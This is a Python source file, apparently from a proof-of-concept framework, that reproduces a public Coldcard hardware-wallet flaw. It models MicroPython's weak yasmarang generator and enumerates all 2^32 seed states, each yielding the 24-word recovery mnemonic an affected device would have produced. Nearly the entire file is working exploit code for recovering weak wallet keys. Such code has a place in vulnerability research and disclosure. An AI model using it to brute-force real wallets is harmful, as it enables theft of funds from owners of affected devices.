"""Coldcard yasmarang path weak-key enumerator — Generator implementation"""
import sys, os, hashlib
from typing import Iterator, Optional, Tuple

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "ngu"))

from libngu_port import Yasmarang, my_random_bytes, TrngFault, M32
import bip39

from base import PocGenerator

TOTAL_SPACE = 2**32


class MpyRngGet:
    """MicroPython modurandom.c yasmarang — degenerate rng_get() implementation"""

    def __init__(self, pad_seed):
        self.pad = pad_seed & M32
        self.n   = 69
        self.d   = 233
        self.dat = 0

    def __call__(self):
        self.pad = (self.pad + self.dat + self.d) & M32
        self.pad = (((self.pad << 3) & M32) + (self.pad >> 29)) & M32
        self.n = (self.n + 0x6C8E787D) & M32
        self.n = (((self.n << 13) & M32) + (self.n >> 19)) & M32
        c = (self.d ^ self.n) & M32
        self.d = (self.dat + (((self.d << 7) & M32) + (self.d >> 25))) & M32
        self.dat = (c + self.pad) & M32
        return self.dat


def make_new_wallet_mnemonic(pad_seed: int) -> Optional[str]:
    """
    Given the rng_get() pad initial state, reproduce make_new_wallet():
      random.bytes(32) -> my_random_bytes(CHIP_TRNG XOR my_yasmarang)
      sha256 whitening -> bip39 mnemonic

    If the TRNG check triggers (consecutive duplicates), this pad is invalid -> return None
    """
    mpy_rng = MpyRngGet(pad_seed)
    libngu_yas = Yasmarang()
    try:
        raw = my_random_bytes(32, mpy_rng, libngu_yas)
    except TrngFault:
        return None
    seed = hashlib.sha256(raw).digest()
    return bip39.b2a_words(seed)


class YasmarangBypassGenerator(PocGenerator):
    """
    Enumerate 2^32 MicroPython yasmarang pad initial states;
    each deterministically produces a 24-word mnemonic.
    """

    @property
    def poc_id(self) -> str:
        return "yasmarang_bypass"

    @property
    def poc_name(self) -> str:
        return "TRNG mislinked to yasmarang (public vulnerability reproduction)"

    @property
    def total_space(self) -> int:
        return TOTAL_SPACE

    def generate(self, start_index: int) -> Iterator[Tuple[int, Optional[str]]]:
        for pad_idx in range(start_index, TOTAL_SPACE):
            mnemonic = make_new_wallet_mnemonic(pad_idx)
            yield (pad_idx, mnemonic)
